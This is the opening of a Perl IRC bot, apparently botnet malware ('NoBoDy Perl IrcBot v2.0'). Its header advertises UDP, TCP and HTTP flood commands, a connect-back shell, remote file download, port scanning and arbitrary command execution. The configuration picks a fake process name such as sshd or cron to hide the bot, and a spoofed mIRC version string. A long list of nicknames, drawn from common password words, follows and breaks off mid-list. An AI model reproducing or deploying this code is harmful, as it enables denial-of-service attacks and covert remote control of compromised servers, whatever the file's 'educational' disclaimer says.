#!/usr/bin/perl

######################################################################################################################
######################################################################################################################
##  NoBoDy Perl IrcBot v2.0 / 2012 by Jericho Security Team       ## [ Help ] ###########################################
##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
##        Teste on every system with PERL instlled             ##  !u @system                                       ##
##                                                             ##  !u @version                                      ##
##     This is a free program used on your own risk.           ##  !u @channel                                      ##
##        Created for educational purpose only.                ##  !u @flood                                        ##
## I'm not responsible for the illegal use of this program.    ##  !u @utils                                        ##
######################################################################################################################
## [ Channel ] #################### [ Flood ] ################################## [ Utils ] ###########################
######################################################################################################################
##  !u !join <#channel>	         ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
##  !u !part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
##  !u !rejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
##  !u !deop <channel> <nick>    ##  !u @http <site> <time>                   ##           <recipient> <message>    ##
##  !u !voice <channel> <nick>   ##                                           ##  !u pwd;uname -a;id <for example>  ##
##  !u !devoice <channel> <nick> ##  !u @ctcpflood <nick>                     ##  !u @port <ip> <port>              ##
##  !u !nick <newnick>           ##  !u @msgflood <nick>                      ##  !u @dns <ip/host>                 ##
##  !u !rnick (random nick)      ##  !u @noticeflood <nick>                   ##                                    ##
##  !u !msg <nick>               ##                                           ##                                    ##
##  !u !quit                     ##                                           ##                                    ##
##  !u !raw                      ##                                           ##                                    ##
##  !u @die                      ##                                           ##                                    ##
##  !u @admin (add/del) <nick>   ##                                           ##                                    ##
######################################################################################################################
######################################################################################################################

#############################
##### [ Configuration ] #####
#############################

my @rps = ("/usr/local/apache/bin/httpd -DSSL",
      	   "/usr/sbin/httpd -k start -DSSL",
           "/usr/sbin/httpd",
           "/usr/sbin/sshd -i",
           "/usr/sbin/sshd",
           "/usr/sbin/sshd -D",
           "/usr/sbin/apache2 -k start",
           "/sbin/syslogd",
           "/sbin/klogd -c 1 -x -x",
           "/usr/sbin/acpid",
           "/usr/sbin/cron");
my $process = $rps[rand scalar @rps];

my @rversion = ("\001mIRC v6.35 K.Mardam-Bey\001",
                "\001mIRC v7.0 Khaled Mardam-Bey\001",
                "\001mIRC v7.01beta Khaled Mardam-Bey\001",
                "\001mIRC v7.02beta Khaled Mardam-Bey\001",
                "\001mIRC v7.03beta Khaled Mardam-Bey\001",
                "\001mIRC v7.04beta Khaled Mardam-Bey\001",
                "\001mIRC v7.05beta Khaled Mardam-Bey\001",
                "\001mIRC v7.06beta Khaled Mardam-Bey\001",
                "\001mIRC v7.07beta Khaled Mardam-Bey\001",
                "\001mIRC v7.08beta Khaled Mardam-Bey\001",
                "\001mIRC v7.1 Khaled Mardam-Bey\001",
                "\001mIRC v7.11beta Khaled Mardam-Bey\001",
                "\001mIRC v7.12beta Khaled Mardam-Bey\001",
                "\001mIRC v7.14 Khaled Mardam-Bey\001",
                "\001mIRC v7.15 Khaled Mardam-Bey\001",
                "\001mIRC v7.16 Khaled Mardam-Bey\001",
                "\001mIRC v7.17 Khaled Mardam-Bey\001",
                "\001mIRC v7.18beta Khaled Mardam-Bey\001",
                "\001mIRC v7.19 Khaled Mardam-Bey\001",
                "\001mIRC v7.22 Khaled Mardam-Bey\001",
                "\001mIRC v7.23beta Khaled Mardam-Bey\001");
my $vers = $rversion[rand scalar @rversion];

my @rircname = ("aardvark","aaron","abacab","abbore","abbott","abby","abdulrazak","abigail","ably",
                "absolut","abyss","accord","ace","ackerman","acrima","acropolis","action","active",
                "acura","adam","adams","addison","adelstein","adg","adi","adibe","adidas","adorno",
                "adrian","adrock","advil","aerobics","aerodream","afkdemon","africa","agent","ahlers",
                "ainthere","airborne","airwolf","aki","alaska","alavi","albert","alberto","alcorn",
                "alda","aleks","alex","alexander","alexandr","alexia","alexis","alexndra","alfaro",
                "alfred","ali","alias","alice","alicia","alien","aliens","alikki","alina","aline","alison",
                "allegro","allen","allison","allo","allstate","aloha","alongi","alpha","alpine",
                "altamira","altavilla","altenberger","altenhofen","alterego","althea","altima",
                "alvin","amanda","amaral","amatangelo","amazing","amber","ambra","amed","ameer",
                "amelie","america","amour","amsden","amy","anaconda","anand","anca","andel","anders",
                "anderson","andjela","ando","andre","andrea","andreas","andrelus","andrew","andrew",
                "andromed","andron","andy","anfinrud","angel","angela","angels","angie","angus","animal",
                "animals","anita","anja","anjing","ann","anna","anne","anneli","annette","annie","ansley",
                "antares","anthony","antos","apeq","apollo","apple","applepie","apples","april","aptiva",
                "aqua","aquarius","aragorn","arbia","arcangelo","archie","arduini","arellano","ariane",
                "ariel","aristotle","arizona","arjas","arky","arlene","arnold","arntz","arrow","arsenal",
                "arskaz","artemis","arthur","artist","as","ashley","ashraf","ashton","asmodizz","aspen",
                "ass","asshole","assmunch","asssa","asterix","ath","athanas","athena","atkins","attila",
                "august","augustus","aulis","aurelius","aus","austin","autumn","avalon","avatar",
                "avenger","avenir","awesome","axelrod","axworthy","ayelet","ayiemba","aykroyd",
                "ayling","aylmer","azima","babes","baby","babydoll","babylon","bach","bachmuth","backus",
                "badger","bady","baglivo","bagnold","bailar","bailey","bakanowsky","baleja","ballatori",
                "ballew","baltz","bambi","bamboo","banana","bandit","banta","bar","barabesi","barajas",
                "baraka","baranczak","baranowska","barbara","barberi","barbetti","barbie","barn",
                "barneson","barnett","barney","barnyard","barrett","barriola","barry","bart",
                "bartholomew","bartman","bartolome","bartoo","basavappa","baseball","basf","bashevis",
                "basil","basket","basketball","bass","bast","bastard","batchelder","batman","baumiller",
                "bayles","bayo","bball","beaches","beacon","beagle","beal","bean","beaner","beanie","beans",
                "bear","bears","beast","beasty","beatles","beatrice","beautiful","beauty","beaver",
                "beavis","bebe","becca","beckman","bedem","beder","bedford","beer","beeth","behenna",
                "belanger","belaoussof","belfer","belgium","belin","belize","bella","bellavance","belle",
                "bellhouse","bellini","belloc","belmont","ben","benedict","benjamin","benji","benny",
                "benoit","benson","beowulf","bergson","berke","bernard","bernardo","bernassola","bernie",
                "bernston","berrizbeitia","berry","bertha","beryl","best","beta","betacam","betsy","betti",
                "betty","beynart","bharat","biagioli","bichon","bickel","bigal","bigben","bigbird",
                "bigboss","bigdog","biggles","bigmac","bigman","bigred","biker","bilbo","bill","bills",
                "billy","bimmer","bingo","binion","binky","bioboy","biochem","biology","bir","bird","birdie",
                "birdy","birillo","birthday","biscuit","bisema","bisho","bishop","bismillah","bitch",
                "biteme","bitter","biz","bizio","black","blackbourn","blackhand","blackjack","blackwell",
                "blacky","blagg","blah","blakemore","blanche","blanke","blazer","blietta","blinds","bliss",
                "blitz","blizard","blizzard","bloch","bloembergen","bloemhof","blonde","blondenor",
                "blondie","blood","blowfish","blowjob","blowme","bloxham","blue","blueangel","bluebird",
                "bluebus","blueeyes","bluefish","bluejean","blues","bluesky","bluey","blyth","bmw","boat",
                "bob","bobby","bobcat","bobi","bogart","bogey","bogus","bolger","bolick","bollinger","bologna",
                "bombay","bond","boner","bonham","boniface","bonjour","bonnie","bondtime","bonzo","boobie",
                "booboo","booger","boogie","book","bookbinder","boomer","boone","boorstin","booster","boots",
                "bootsie","bopoh","borack","borden","boris","borre","bosco","boss","bossi","boston","bothman",
                "botosh","boudin","boudrot","boulder","bourbon","bourneuf","bowers","boxer","boxers","boy",
                "boyajian","boyes","boyland","boym","boyne","bozo","bracalente","bradac","bradach","bradley",
                "brain","bram","branch","brandi","brandon","brandy","braves","brazil","brecht","breed",
                "brenan","brenda","brennan","brent","brewer","brewster","brian","bridge","bridgeman",
                "bridges","bright","brigitta","brinton","brio","britain","britz","broadway","broca","broker",
                "bronco","bronte","brook","brooke","brother","brrrweg","bruce","brujah","bruno","brutus",
                "bryan","brzycki","bubba","bubble","bubbles","buchan","buck","bucks","buddha","budding",
                "buddy","budgie","buffalo","buffett","buffy","bugs","bugsy","bull","bullard","bulldog",
                "bullet","bulls","bullshit","bunny","bunton","burden","burdzy","burke","burns","burridge",
                "burton","busetta","business","buster","butch","butler","butter","butterfly","butthead",
                "button","buttons","buzz","byatt","byerly","byrd","byron","byteme","cactus","caesar","cage",
                "caitlin","calendar","calgary","california","calnan","calvin","camaro","camay","camel",
                "camera","camille","cammelli","cammilleri","campbell","camping","canada","cancer","candy",
                "canela","canley","cannon","cannondale","canon","canucks","capanni","caperton","capocaccia",
                "capodilupo","cappuccio","caprcorn","captain","capursi","car","caratozzolo",
                "carayannopoulos","carbon","cardinal","carebear","carl","carlin","carlos","carloto",
                "carlyle","carmen","carmichael","carnage","carol","carole","carolina","caroline","carolyn",
                "caroti","carper","carrie","carrot","cartmill","cascade","cascio","case","casey","casio",
                "caspar","casper","cassie","castelda","castle","cat","catalina","catalog","catch","catfish",
                "catgirl","catherine","cathren","cathy","catnip","cats","catwoman","cavanagh","cavell",
                "cecile","cedic","celica","celine","celtics","cemanmp","cement","ceniceros","center",
                "cerioli","cesar","cessna","chad","chainess","chaingone","chainsaw","challenge","chameleon",
                "champion","champs","chance","chandler","chanel","chang","change","changeit","changeme",
                "chantal","chaos","chapman","charger","charity","charles","charlie","charlotte","chat",
                "chck","cheang","cheese","chelsea","cherry","chervinsky","cheryl","chess","chester","chevy",
                "chiara","chiassino","chicago","chicken","chico","chiefs","chien","childress","childs",
                "china","chinacat","chinipardaz","chinman","chinook","chio","chip","chiquita","chloe",
                "chocolat","chocolate","chouette","chris","christ","christenson","christia","christian",
                "christiano","christie","christin","christmas","christoph","christopher","christy",
                "chriz","chronos","chu","chuck","chupasko","church","ciampaglia","cicero","cifarelli",
                "cigs","cinder","cindy","cinema","cintat","circuit","cirque","cirrus","civic","civil",
                "claffey","claire","clancy","clapton","clarissa","clark","clarkson","class","classroom",
                "claude","claudel","claudia","clbiz","clement","cleo","clex","cliff","clifton","clipper",
                "clock","cloclo","clow","clueless","cobain","cobe","coblenz","cobra","cocacola","cocar",
                "cocker","coco","cody","coffee","coito","coke","coldren","colella","colette","colin","collard",
                "collart","colleen","college","collis","color","colorado","colors","colt","coltrane",
                "columbia","comet","commander","compaq","compton","computer","comstock","conan","concept",
                "concino","concorde","condodina","condoom","confused","connect","connie","connors",
                "conrad","content","control","cook","cookie","cookies","cooking","cool","coolbean","coop",
                "cooper","coopers","cooter","copper","cora","cordelia","corey","corky","cornflake","cornish",
                "corona","corrado","corvette","corvonero","corwin","cosmides","cosmo","cosmos","cougar",
                "cougars","counter","country","countzero","courier","courtney","coutaux","cowboy","cowboys",
                "cows","coyote","cper","cqua","crack","cracker","craig","crawford","cread","creative","crescent",
                "cricket","crnaruka","crocker","croshaw","cross","crow","crowley","croxen","croxton","cruise",
                "cruizer","crusader","crystal","cthulhu","cubalibre","cuda","cuddles","cuervo","cui",
                "cunningham","cunt","cupcake","cure","current","currier","curtis","custodes","cutie","cutlass",
                "cutler","cvek","cyber","cyclone","cyders","cynthia","cyrano","daddy","daedalus","dagger",
                "daily","daisie","daisy","dakota","daldalian","dale","dallas","daly","dammit","damogran","dan",
                "dana","dance","dancer","dangelo","danic","daniel","daniela","danieli","danielle","danny",
                "dante","daphne","dapice","dario","dark","darker","darkman","darknz","darkstar","darren",
                "darryl","darwin","das","dasgupta","dasha","dasilva","daskalu","data","database","datatrain",
                "dave","david","davide","davids","davis","daw","dawkins","dawn","daytek","dead","deadhead","dean",
                "death","debbie","deborah","debroff","december","decker","deedee","dees","deeznuts","def",
                "defeciani","degennaro","delano","delapena","delattre","delete","delger","deliver","delta",
                "demigd","deming","demo","demon","dempster","demusz","denali","denault","denham","denis","denise",
                "denison","dennis","denny","depeche","derek","derousse","des","desert","design","deskjet",
                "desombre","destiny","detroit","deutsch","devastor","devil","devine","devon","dexter","dharma",
                "diablo","diabolik","diamond","diana","diane","dianne","dickens","dickhead","dicks","diefenbach",
                "diesel","difabio","difronzo","digger","digital","dilbert","dillweed","dilworth","dim","dimkam",
                "dionysius","dipper","director","dirk","dirksen","disco","disney","dital","dixie","dixon","djtt",
                "doc","dockery","doctor","dodger","dodgers","dog","dogbert","doggy","dogzzz","doherty","doitnow",
                "dolfi","dollar","dollars","dolly","dolphin","dolphins","dominic","dominique","domino","don",
                "donahue","donald","donkey","donna","donner","dontknow","doogie","dookie","doom","doonan","doors",
                "dore","dorf","dork","dorothy","dosi","dottmorte","doty","doudou","doug","dougie","douglas",
                "downtown","dowsland","dracon","draft","dragon","dragonfly","dreamer","dreams","drinker",
                "driver","drtte","duck","duckie","dude","dudley","duffin","duke","dumbass","dumbblnd","dundee",
                "durrett","dusica","dussault","dusty","dutch","dutchess","dwight","dwyer","dye","dylan","eagle",
                "eagles","eardley","easter","eastern","ebe","ebeling","eckel","eclipse","eddie","edgie","edith",
                "edley","edmund","edner","edward","eeee","eeyore","effie","eggist","eickenhorst","eieio","eight",
                "einaimou","einstein","electric","elef","element","eleon","elephant","eliasson","elina","elissa",
                "elizabeth","ella","ellen","elliot","elly","elmendorf","elmerick","elsie","elvis","email",
                "emerald","emily","emmi","emmitt","empire","encer","encinas","enclos","energy","engage","engerim",
                "enigma","enter","enterprise","entropy","enyeart","eppling","erbach","erdman","erdos","erez",
                "eric","erin","erixon","ernie","escort","espinoza","estelle","estes","esther","etoile","etter",
                "eugene","euripides","europe","eurotrash","evelyn","everett","excalibur","excel","explore",
                "explorer","export","express","eyal","fabbris","faculty","fagan","faioes","fairsight","fairview",
                "faith","fakename","falco-acosta","falcon","falorsi","family","faris","farmer","farone",
                "farout","farren","farside","fatboy","fates","faust","fearless","feedback","feigenbaum",
                "fejzo","feldman","felipe","felix","fender","fenris","ferguson","fernald","fernandes","ferrante",
                "ferrari","ferret","ferriell","ferris","feuer","fiction","fidel","fido","field","figaro","fin",
                "finance","fini","fink","finkelstein","finnegan","fiona","fiorina","fire","fireaway","fireball",
                "firebird","fireman","firenze","first","fish","fisher","fishes","fishhead","fishie","fishing",
                "fisk","fitzmaurice","fjortisch","flamingo","flanders","flash","fletch","fletcher","fleurs",
                "flier","flight","flip","flipper","flores","florida","floutti","flower","flowerpot","flowers",
                "floyd","fluffer","fluffy","flum","flute","fly","flyboy","flyer","folks","foobar","fool","football",
                "ford","forest","forester","forever","fortes","fortier","fortune","forward","fossey","fossi",
                "foster","fountain","fox","foxtrot","fozzie","fqw","fra","france","francesco","francine","francis",
                "francisco","francois","frank","franka","franklin","franz","frazier","freak","fred","freddie",
                "freddy","frederic","free","freebird","freedom","freem","freeman","freew","freid","french","freud",
                "freundlich","friday","fried","friedland","friend","friends","frisco","frisken","fritz","frodo",
                "frog","froggie","froggies","froggy","frogs","front","frontier","frowiss","fryberger","frye",
                "fubar","fucker","fuckface","fuckme","fuckoff","fucku","fuckyou","fugazi","fujii-abe","fuller",
                "fun","funguy","funny","funtime","furia","furth","furunkuli","fusaro","future","fuzz","fwsmou",
                "gabby","gabriel","gabriell","gabrielli","gaby","gad","gaelic","gaggiotti","galaxy","galeotti",
                "galileo","galwey","gambini","gambit","gambler","games","gammaphi","gamppy","gandalf","garcia",
                "garden","garfield","garfunkel","gargoyle","garlic","garman","garnet","garonna","garth","gary",
                "gasman","gaston","gateway","gator","geller","gemberling","gemini","general","genesis","genius",
                "george","georgi","georgia","gerald","gerhard","german","germany","geronimo","gerrett","getout",
                "ggeorge","ghorai","ghost","ghostie","giants","gibbens","gibbons","gibson","gigi","gilbert",
                "gilgamesh","gili","gill","gilles","gillispie","ginger","gingers","girlie","giselle","gist",
                "giugno","gizmo","gleason","glegg","glendon","glenn","glidaren","glider","global","gmoney","go",
                "goat","goaway","goblin","goblue","gocougs","godiva","godzilla","goethe","gofish","goforit","gold",
                "golden","goldfarb","goldfish","golf","golfer","gollum","gomora","goncalves","gone","gonzalez",
                "goober","good","good-luck","goodearl","goodluck","goody","goofy","goose","gopher","gordon",
                "gozzi","grace","gracie","graham","gramps","grandma","grant","graphic","grateful","grave","gravell",
                "gravis","gray","graymail","graz","greed","green","greenberg","greenday","greenfeld","greg",
                "gregory","gremlin","greta","gretchen","gretel","gretzky","griffiths","grigoletto","grizzly",
                "groovy","grover","grron","grummell","grumpy","gruner","gruppe","gsm","gsmgsm","gsund","guenthart",
                "guess","guest","gufoao","guido","guinness","guitar","gumby","gunn","gunner","guo","gustavo","ha",
                "haar","hacker","hackman","hackshaw","haggis","haha","hailey","hal","haley","hali","halkias",
                "hallas","halloween","hallowell","halpert","hambarzumjan","hamer","hamid","hamilton","hamlet",
                "hammer","hammerness","hand","hank","hanna","hannah","hansolo","hanson","hanssen","happy",
                "happyday","hardcore","harding","hargraves","harley","harlow","haro","harold","harri","harriet",
                "harrigan","harris","harrison","harry","hartman","hartmann","hartnett","harvard","harvey",
                "harwell","haviaras","hawk","hawkes","hawkeye","hayes","haynes","hazel","hazlewood","hazor",
                "health","heart","heather","heaven","hector","hedgehog","heermans","heft","heidi","heikki",
                "heiland","helen","helena","helene","hell","hellman","hellmiss","hello","hellohello","help",
                "helper","helpme","helprin","hemphill","hendrix","henery","henrichs","henry","herbert",
                "herbiez","herman","hermes","hernandez","herrera","hershey","herzog","hester","heubert",
                "heyeck","heythere","highland","hilbert","hilda","hillary","himmelfarb","hind","hirst",
                "histoire","history","hitchcock","hithere","hitler","hlios","hoang","hobbes","hobbit","hock",
                "hockey","hoffer","hoffi","hoffman","hokanson","hokoda","hola","holiday","holly","holmes",
                "holoien","holter","holway","holzman","home","homebrew","homer","homerj","honda","honeii","honey",
                "hongkong","hooker","hoops","hoosier","hootie","hope","hopkins","hopolo","horizon","hornet",
                "horse","horses","horsley","hosehead","hoshida","hostage","hotdog","hotrod","hottle","house",
                "houston","howard","hoy","huang","hudson","huey","hug","hugh","hugo","huidekoper","hummer",
                "hungerford","hunter","huntington","hupp","hurtubise","huskies","hutchings","hyde",
                "hydrogen","iaquinta","iasv","ibanez","ibanz","ibar","ibub","icecream","iceman","ichikawa",
                "idiot","idontknow","iforget","ifwas","igarashi","igi","iguana","illusins","ilmari","iloveu",
                "iloveyou","image","imagine","imp","impact","impala","inamura","indian","indiana","indigo",
                "indonesia","info","informix","ingvar","inkworks","inniss","insane","inside","insight",
                "instruct","integra","integral","intern","internet","intrepid","ioana","iomega","iplord",
                "ireland","irene","irina","iris","irish","irmeli","ironman","isaac","isabel","isabelle",
                "isaievych","isbill","island","israel","isserman","italia","italy","ivan","iyer","izzy","ja",
                "jacenko","jack","jackie","jackson","jacob","jaffa","jagers","jagger","jagoe","jaguar",
                "jaimeafk","jain","jake","jakey","jamaica","james","jamesbond","jamezdin","jamie","jamil",
                "jamjam","jan","jane","janet","janice","janjigian","janne","japan","jared","jarnagin",
                "jarrell","jasmin","jasmine","jason","jasper","javagrl","jay","jayc","jazz","jean","jeanette",
                "jeanne","jedi","jeepster","jeff","jeffers","jeffrey","jejborta","jellis","jenifer",
                "jenkins","jenni","jennie","jennifer","jenny","jensen","jer","jeremy","jerry","jersey",
                "jespersen","jesse","jessica","jessie","jester","jesus","jethro","jethrotull","jetta",
                "jewels","jewett","jim","jimbo","jimbob","jimi","jimmy","jj","jker","jkl","jkm","jlt","jn","joanie",
                "joanna","jockey","joe","joel","joelbitar","joelle","joey","johan","johanna","johannes",
                "johannesson","johannsen","john","johndow","johnny","johns","johnson","jojo","joker",
                "jolly","jonathan","joni","jonni","jordan","jordie","jorge","jorgensen","jornx","josee",
                "joseph","josh","joshua","josie","jossumi","journey","joy","joyce","jsbach","jubilee","jucks",
                "judith","judy","juge","juha","juhani","juhas","jules","julia","julian","juliano","julie",
                "julien","juliet","julious","julze","jumanji","jumbo","jump","junebug","junior","juniper",
                "jupiter","jussi","justdoit","justice","justin","juutsu","kabbash","kaboolian","kafadar",
                "kajman","kalamazo","kalbfleisch","kalca","kali","kaligian","kalil","kalinowski","kalman",
                "kamel","kamileon","kangaroo","kangis","kardinal","karen","karin","karine","karma",
                "karpouzes","kasandra","kassower","kasten","kat","katarina","kate","katerina","katherine",
                "kathleen","kathy","katie","kaviee","kawachi","kayla","kbee","kcin","kee","keenan","keeper",
                "keepout","keepper","keith","kelker","keller","kelly","kelsey","kempton","kemsley","ken",
                "kendall","kenea","kennedy","kenneth","kenny","kerala","kermit","kerry","kerrya","ketchup",
                "keul","keung","kevin","kewin","khan","khong","kidder","kids","kikeli","kikii","killer","kilroi",
                "kim","kimberly","kimmel","kimmett","kimura","kindall","king","kingdom","kingfish","kings",
                "kinsley","kippenberger","kirk","kirscht","kissa","kissme","kitkat","kitten","kittridge",
                "kitty","kittycat","kiwi","kkkkkk","klaara","kleckner","kleenex","kleiman","kleinfelder",
                "klemperer","kliimax","klimas","kling","klinkenborg","klint","knicks","knight","knuff",
                "koala","kobrick","koch","kode","kohn","koivumaki","kojv","koko","kombat","kommer","koniaris",
                "konrad","kool","koopal","korzybski","kotter","kovaks","kraemer","krailo","kralj","kramer",
                "krash","krasney","kraus","kris","krista","kristen","kristi","kristin","kristine","kroemer",
                "kronos","krysiak","ktx","kuenzli","kumar","kungen","kuppa","kurai","kusman","kuwabara",
                "la","lab","labtec","labunka","lacrosse","laddie","lady","ladybug","lafler","laing","lakers",
                "lala","lallemant","lambda","lamer","lamour","lance","landes","lankes","lantieri","lanzit",
                "larry","laser","laserjet","laserna","lashley","lassie","latina","laura","laurel","lauren",
                "laurie","law","lawless","lawrence","lawson","lawyer","leader","leaf","leblanc","lecar","lecce",
                "leclercq","ledzep","lee","legal","legend","leite","leland","lemon","lena","lenisaway","leo",
                "leon","leonard","leslie","lesser","lessi","lestat","lester","letmein","letter","letters","lev",
                "lexus","liakos","liberty","libra","library","lidano","liem","life","light","lightfoot",
                "lights","lily","lim","lima","linares","lincoln","linda","linder","lindsay","lindsey","line",
                "linehan","lingyee","linux","linzee","lionel","lionking","lions","lippmann","lipponen","lisa",
                "lisha","lissabon","litta","little","littleboy","litvak","livernash","liverpoo","liverpool",
                "livi","livolsi","liyen","liz","liza","lizard","lizardo","lizzy","lloyd","locatelli","logan",
                "logger","logical","logos","loislane","loki","lola","lolita","london","lonely","lonelygal",
                "lonestar","lonewolf","longer","longhorn","longworth","looney","lopez","lordie","loren","lori",
                "lorna","lorraine","lorrie","loser","loss","lost","lotus","lou","louis","louise","love","lovebyte",
                "lovely","loveman","loveme","lovers","loveyou","lowenstein","loza","lph","luarbiasa","lubin",
                "lucas","lucia","luciano","lucifer","lucignol","lucky","lucy","luczkow","luecke","lullaby",
                "lulu","lunatic","lunetta","luny","luoma","lupo","lussier","lutcavage","luzader","lynn","ma","mac",
                "maccormac","macdonald","maceachern","macesgl","macha","macintosh","macintyre","mackenney",
                "macmillan","macross","macse","macy","madd","maddie","maddog","madeline","madigan","madison",
                "madmax","madoka","madonna","maggie","maggio","magic","magnum","mahony","maiden","maier","mail",
                "mailer","mailman","maine","maisano","major","majordomo","makeitso","malatesta","malcolm",
                "malibu","malkav","mallard","maller","malova","malr","mamakians","mamaw","manageme","manalis",
                "manarimou","manarisou","mandel","manganiello","manson","mantovan","mantra","manuel",
                "maradona","marakana","marathon","marc","marcel","march","marchbanks","marco","marcus",
                "margalit","margaret","margetts","maria","mariah","marie","marielle","marillion","marilyn",
                "marina","marine","mariner","marino","mario","mariposa","mark","market","marlboro","marley",
                "marques","mars","marshall","mart","martha","martin","martinez","martochio","marton","marty",
                "marubini","marvin","mary","maryjane","mass","master","matalka","matarazzo","math","matrix",
                "matsukata","matt","matthew","matti","mattingly","mattson","maurice","maurino","mauzy",
                "maverick","max","maxime","maxine","maxmax","maxwell","may","mayday","mazda","mazzali",
                "mazziotta","mcalcota","mcbride","mccaffery","mccall","mcclearn","mcdowell","mcelroy",
                "mcfadden","mcghee","mcgoldrick","mcilroy","mcintosh","mckenna","mclane","mclaren","mcnealy",
                "mcnulty","me","meatloaf","meccariello","mech","mechanic","media","medical","megan","meggie",
                "meister","melanie","melina","melinda","melissa","mellon","melody","memisoglu","memory",
                "memphis","mensuck","menzies","meow","meph","mephisto","mercedes","mercer","mercury","merde",
                "merikoski","merlani","merlin","merlot","mermaid","merminod","merrill","merseth","merz","metal",
                "metallic","metelka","metropolis","meurer","mexico","mg","mhj","mhz","miami","michael","michal",
                "michel","michele","michelle","michelman","michigan","michou","mickel","mickey","micro",
                "microsoft","middle","midnight","midori","midvale","midway","mieher","mig","miina","mika","mikael",
                "mikav","mike","mikemcgii","mikey","miki","mikko","mikma","milano","miles","millenium","miller",
                "millie","million","mills","mimi","mimma","mindy","mine","minh","mini","minichiello","minnie",
                "minou","miracle","mirage","miranda","miriam","mirror","misha","mishka","miss","mission","missy",
                "misty","mitch","mitchell","mitropoulos","mittal","mmm","mmmmmm","mmouse","mobile","mobydick",
                "mocroft","modem","modestino","moeller","mohr","moiamedi","mojo","moladmin","molly","molson",
                "mom","monday","monet","money","monica","monikaw","monique","monkey","monkeyboy","monopoly",
                "monque","monroe","monster","monstop","montana","montilio","montreal","montrose","monty",
                "moocow","mookie","mooks","moomoo","moon","moonbeam","moor","moore","moose","mopar","morani",
                "mordeshur","morecats","moreton","morgan","moroni","morpheus","morris","morrison","morrow",
                "mort","mortimer","mosher","mosler","mostafavi","mother","motooka","motor","motorola","mountain",
                "mouse","movies","mowgli","mozart","mpdike","mrbate","mrbeauty","mrblom","mrbx","mrjee","mro",
                "mrtabizy","mrx","mrxx","msd","mu","mudarri","muello","muffin","mugnai","muimui","mulder","mulkern",
                "mulroy","mumford","munchkin","murphy","murray","musashi","musc","musce","muscle","music",
                "musicgal","mussachio","mustang","muti","myboy","mystr","mythic","mywife","naddeo","nadia","nadine",
                "nallllle","nanask","nancy","naomi","napoleon","napolitano","nardi","nardone","nascar","nat",
                "natalie","natasha","natborta","nathan","nation","national","nautica","naviaux","nayduch","ncc",
                "nccd","ncce","ncubus","ne","nea","nebraska","neil","neko","nellie","nelson","nemesis","nenna","nermal",
                "nes","nesbit","nesbitt","nescim","nestle","netware","network","neuman","neutrino","new",
                "newaccount","newcourt","newfeld","newlife","newlin","newpass","news","newton","newuser",
                "newyork","nexus","ng","nguyen","ni","nicarao","niceguy","nicholas","nichole","nick","nickerson",
                "nicklaus","nickoloff","nico","nicole","nigel","nightshadow","nightwind","nike","niki","nikita",
                "nikki","niklas","nimfa","nimrod","nina","niners","nino","nintendo","nirvana","nisenson","nissan",
                "nisse","nitabach","nite","nokia","nomore","none","nopass","noriko","normal","norman","norton",
                "notebook","nothing","notman","notta","notused","nouveau","novell","noway","nugget","number",
                "numbers","nurse","nurul","nutmeg","nuzum","oatmeal","oaxaca","obiwan","obiwanbip","obsession",
                "ocean","ocougne","october","ogata","ogre","oh","ohagan","ohshit","oicu","oldford","olive","oliver",
                "olivia","olivier","ollie","olsen","olson","olszewski","omalley","oman","omeara","omega","one",
                "online","only","opel","open","openup","opera","opus","orac","orace","orange","oranges","oranzzzzz",
                "oray","orchid","oregon","oreo","orfield","organza","orion","orlando","orsi","orville","oscar",
                "ospina","ostrowski","ottaviani","otten","otter","ou","ouchida","ourlove","outworld","outzake",
                "overkill","ovid","oxford","oxygn","ozzy","paagal","pacers","pacific","packard","packer","packers",
                "packrat","paesdealmeida","paine","paint","painter","paladin","palayoor","palepu","paliadog",
                "pallara","palmitesta","paloma","pam","pamela","panadero","pancake","panda","pandora","panic",
                "panizzon","pantera","panther","pantilla","paoletti","papa","paradigm","paris","park","parker",
                "parmeggiani","parola","parris","parrot","partner","partridge","pascal","pascucci","pass",
                "passion","passwd","password","pat","patches","patefield","patricia","patrick","patriots",
                "patton","pattullo","paul","paula","pauline","pavel","pavetti","pavlon","pawloski","paynter",
                "payton","pazarac","peabody","peace","peach","peaches","peanut","peanuts","pearl","pearlberg",
                "pearljam","pederson","pedro","peewee","peggy","peishel","pekka","pencil","penelope","penguin",
                "penny","pentium","people","pepper","pepsi","percy","pereira","perfect","performa","perko","perlak",
                "perlman","permaloso","perna","perone","perrimon","perroz","perry","person","pessaar","pete",
                "peter","peterk","peterpan","peters","petey","petruzello","pettibone","pettit","petunia","pfister",
                "phantom","phialpha","phil","philip","philips","phillips","phish","phishy","phoenix","phone",
                "photo","phre","phreaky","piano","pianoman","pianos","picard","picasso","pickle","picture",
                "pierce","pierre","pigeon","piglet","pihkal","pilbeam","pinball","pink","pinkfloyd","pinot","pioneer",
                "pipeline","piper","pirate","pisces","pit","pizza","plancon","planet","plant","plasket","plato","play",
                "playboy","player","players","please","plous","plus","pluto","po","pocobene","poesje","poetic","poetry",
                "poincaire","pointer","poirier","poison","poiuyt","polak","polanyi","polar","polaris","pole","police",
                "politics","politis","polo","poma","pomme","pontiac","poofie","poohbear","pookey","pookie","poolman",
                "popcorn","pope","popeye","poppy","popy","porsche","porter","portland","power","powerpc","powers",
                "pper","ppp","praise","prayer","precious","predator","prelude","premier","presper","preston",
                "preucel","prevost","primera","primetime","primus","prince","princess","print","printing",
                "pritchard","pritz","prof","proietti","prometheus","property","protel","prothrow","provider",
                "proxyma","psalms","pshyche","psioncore","psiximou","psixisou","psycho","psychosis","psyidle",
                "pszaah","public","puccia","puddin","pugh","pulsar","pumpkin","punkin","puppetm","puppy","purple",
                "pussy","pynchon","pyramid","pyro","python","pzzzz","pqq","quaday","quality","quattro","quebec",
                "queen","queenie","quentin","quest","question","quetin","qwaszx","qwer","qwert","qwerty","qwertyui",
                "ra","rabbit","rabe","rabkin","racer","racerx","rachel","rachelle","racoon","radar","radeke","radio",
                "rafiki","ragio","ragnetto","raiden","raiders","rain","rainbow","raindance","raistlin","raistln",
                "rajagopalan","raleigh","ralph","ram","rambo","rancid","random","randy","raney","rangan","ranger",
                "rangers","rankin","ranu","rapple","raptor","raquel","rascal","raska","rasta","rastafarian","ratio",
